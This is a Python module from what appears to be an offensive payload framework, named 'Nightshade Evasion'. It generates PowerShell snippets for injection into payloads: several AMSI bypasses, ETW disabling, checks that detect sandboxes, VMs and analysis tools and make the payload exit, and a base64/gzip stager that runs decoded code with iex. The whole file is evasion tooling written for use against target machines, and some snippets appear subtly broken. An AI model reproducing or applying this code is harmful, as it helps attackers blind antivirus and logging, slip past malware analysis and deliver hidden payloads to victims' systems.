"""
Nightshade Evasion -- AMSI bypasses, ETW patching, sandbox/VM detection,
boot-time check, user activity check, process count check, disk size check.
Generates PowerShell/VBA snippets that execute *at runtime on target*.
"""
import random
import string


class EvasionGenerator:
    """
    Produces evasion code fragments injected into payloads so the
    *target* host runs them -- not the operator's box.
    """

    # ------------------------------------------------------------------ #
    #  AMSI bypasses                                                       #
    # ------------------------------------------------------------------ #
    AMSI_BYPASSES = [
        # 1. Registry -- patch AMSI provider
        r"""
$k=[Ref].Assembly.GetTypes();Foreach($t in $k){if($t.Name -like "*iUtils"){$c=$t.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$f=$c.GetValue($null);$p=[Ref].Assembly.GetTypes();Foreach($t2 in $p){if($t2.Name -like "*Unsafe*"){$m=$t2.GetMethods('NonPublic,Static')|?{$_.Name -like "*Init"};$m.Invoke($null,@($f,[Int]0,$null))}}}}
""".strip(),
        # 2. Memory patching -- patch amsi.dll!AmsiScanBuffer
        r"""
$w=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([Action]({}))), [Type]([Action])).Module.GetType('System.Runtime.InteropServices.Marshal').GetMethods('NonPublic,Static')|?{$_.Name -eq 'GetFunctionPointerForDelegate'}
[System.Runtime.InteropServices.Marshal]::WriteInt32(([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(([Action]({})))),[Type]([Action]))).Module.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null),0,0)
""".strip(),
        # 3. Forcing amsiInitFailed flag
        r"""
$amsi=[Ref].Assembly.GetTypes()|?{$_.Name -like "*Amsi*"};$f=$amsi.GetFields('NonPublic,Static')|?{$_.Name -like "*amsi*"};$f.SetValue($null,$true)
""".strip(),
        # 4. HKCU registry disable
        r"""
try{New-Item -Path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Force|Out-Null;Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -Value 0 -Force}catch{}
""".strip(),
        # 5. AmsiScanBuffer patch via Win32 API
        r"""
$amsi=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('SgB1AHMAdABfAEEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAA='))
$amsi.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
""".strip(),
    ]

    # ------------------------------------------------------------------ #
    #  ETW bypass                                                         #
    # ------------------------------------------------------------------ #
    ETW_BYPASS = r"""
$etw=[System.Reflection.Assembly]::LoadWithPartialName('System.Core');$e=$etw.GetTypes()|?{$_.Name -eq 'EventLogger'};$f=$e.GetFields('NonPublic,Static')|?{$_.Name -eq 'EventProviderEnabled'};$f.SetValue($null,$false)
"""

    ETW_BYPASS_V2 = r"""
# ETW bypass via patching ntdll!EtwEventWrite
try{$ntdll=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('bntkbGwuZExs'));$e=$ntdll.GetTypes()|?{$_.Name -like '*Native*'};$m=$e.GetMethods('NonPublic,Static')|?{$_.Name -like '*EtwEventWrite*'};$m.Invoke($null,@([IntPtr]::Zero,[Int32]0,[IntPtr]::Zero,[Int32]0))}catch{}
"""

    # ------------------------------------------------------------------ #
    #  Sandbox / VM / analysis checks                                     #
    # ------------------------------------------------------------------ #
    SANDBOX_CHECKS = r"""
$evade=$true
try{$evade=(Get-CimInstance Win32_ComputerSystem).Model -match 'VirtualBox|VMware|Virtual|QEMU|KVM|Xen'}catch{}
if(-not $evade){try{$evade=(Get-Process|?{$_.Name-match'vmtoolsd|vbox|procmon|wireshark|tcpview|ProcessHacker|pestudio|x64dbg|ida64|ollydbg|dnSpy'}).Count-gt0}catch{}}
if(-not $evade){try{$evade=(Get-WmiObject Win32_LogicalDisk|?{$_.Size-gt0}).Count-lt2}catch{}}
if(-not $evade){try{$evade=(Get-CimInstance Win32_LogicalDisk|Measure-Object -Property Size -Sum).Sum -lt 120GB}catch{}}
if(-not $evade){try{$evade=[Math]::Truncate((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1MB)-lt 2048}catch{}}
if(-not $evade){try{$evade=(Get-CimInstance Win32_Processor).NumberOfCores-lt 2}catch{}}
if(-not $evade){try{$evade=[Environment]::UserName-match'Admin|User|Sandbox|Malware|Test'}catch{}}
if($evade){exit}
"""

    JITTER_SLEEP = r"""
$j=Get-Random -Minimum {min} -Maximum {max};Start-Sleep -Seconds $j
"""

    # ------------------------------------------------------------------ #
    #  Enhanced sandbox checks                                             #
    # ------------------------------------------------------------------ #

    @staticmethod
    def boot_time_check() -> str:
        """Check if system boot time is recent (<10 min = sandbox restart)."""
        return r"""
# Boot time check -- recent boot (<10 min) suggests sandbox
try {
    $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $uptime = [DateTime]::Now - $boot
    if ($uptime.TotalMinutes -lt 10) { exit }
} catch {}
"""

    @staticmethod
    def user_activity_check() -> str:
        """Check for user activity -- multiple logged-in users, recent input."""
        return r"""
# User activity check
try {
    $sessions = (query user 2>$null) -split "`n"
    if ($sessions.Count -lt 2) { 
        # No one logged in or only current session -- could be sandbox
        Start-Sleep -Seconds 30
    }
} catch {}

try {
    $lastInput = [PInvoke.Win32.UserInput]::GetLastInputInfo()
    if ($lastInput -gt 600000) { exit }  # No input for 10+ min
} catch {}
"""

    @staticmethod
    def process_count_check(threshold: int = 30) -> str:
        """Check if running process count is below threshold (<30 = sandbox)."""
        return f"""
# Process count check -- low process count suggests sandbox
try {{
    $pCount = (Get-Process).Count
    if ($pCount -lt {threshold}) {{ exit }}
}} catch {{}}
"""

    @staticmethod
    def disk_size_check(min_gb: int = 120) -> str:
        """Check total physical disk size."""
        return f"""
# Disk size check -- small disk suggests VM/sandbox
try {{
    $diskSize = (Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum
    if ($diskSize -lt ({min_gb}GB)) {{ exit }}
}} catch {{}}
"""

    @staticmethod
    def domain_joined_check() -> str:
        """Check if machine is domain-joined (non-domain machines in sandboxes)."""
        return r"""
# Domain join check
try {
    $cs = Get-CimInstance Win32_ComputerSystem
    if (-not $cs.PartOfDomain) {
        # Non-domain machines are riskier -- delay
        Start-Sleep -Seconds 45
    }
} catch {}
"""

    @staticmethod
    def full_sandbox_checks() -> str:
        """Assemble all enhanced sandbox checks into one block."""
        checks = [
            EvasionGenerator.boot_time_check(),
            EvasionGenerator.process_count_check(),
            EvasionGenerator.disk_size_check(),
            EvasionGenerator.user_activity_check(),
            EvasionGenerator.domain_joined_check(),
        ]
        return "\n".join(checks)

    # ------------------------------------------------------------------ #
    #  Generators                                                         #
    # ------------------------------------------------------------------ #

    @staticmethod
    def random_amsi_bypass() -> str:
        return random.choice(EvasionGenerator.AMSI_BYPASSES)

    @staticmethod
    def full_evasion_block() -> str:
        """Assemble AMSI + ETW + sandbox checks into one preamble block."""
        return "\n".join([
            EvasionGenerator.random_amsi_bypass(),
            random.choice([EvasionGenerator.ETW_BYPASS, EvasionGenerator.ETW_BYPASS_V2]),
            EvasionGenerator.SANDBOX_CHECKS,
        ])

    @staticmethod
    def full_evasion_block_enhanced() -> str:
        """Assemble AMSI + ETW + ALL sandbox checks (legacy + enhanced)."""
        return "\n".join([
            EvasionGenerator.random_amsi_bypass(),
            random.choice([EvasionGenerator.ETW_BYPASS, EvasionGenerator.ETW_BYPASS_V2]),
            EvasionGenerator.SANDBOX_CHECKS,
            EvasionGenerator.full_sandbox_checks(),
        ])

    @classmethod
    def jitter_sleep(cls, min_s: int = 45, max_s: int = 120) -> str:
        return cls.JITTER_SLEEP.replace("{min}", str(min_s)).replace("{max}", str(max_s))

    @staticmethod
    def obfuscate_string(s: str) -> str:
        """Build a -join/fchar-expression to hide strings from static analysis."""
        parts = [f'[char]{ord(c)}' for c in s]
        return f"$(''.join({{}}))".format(','.join(parts))

    @staticmethod
    def random_var_name(length: int = 8) -> str:
        return '_' + ''.join(random.choices(string.ascii_lowercase, k=length))

    # ------------------------------------------------------------------ #
    #  COMPRESSED_STAGER                                                   #
    # ------------------------------------------------------------------ #
    COMPRESSED_STAGER = r"""
function Invoke-Stage2 {{
    param($b64)
    $raw=[System.Convert]::FromBase64String($b64)
    $ms=New-Object IO.MemoryStream($raw)
    $ds=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)
    $sr=New-Object IO.StreamReader($ds)
    $out=$sr.ReadToEnd();$sr.Close();$ds.Close();$ms.Close()
    iex $out
}}
"""
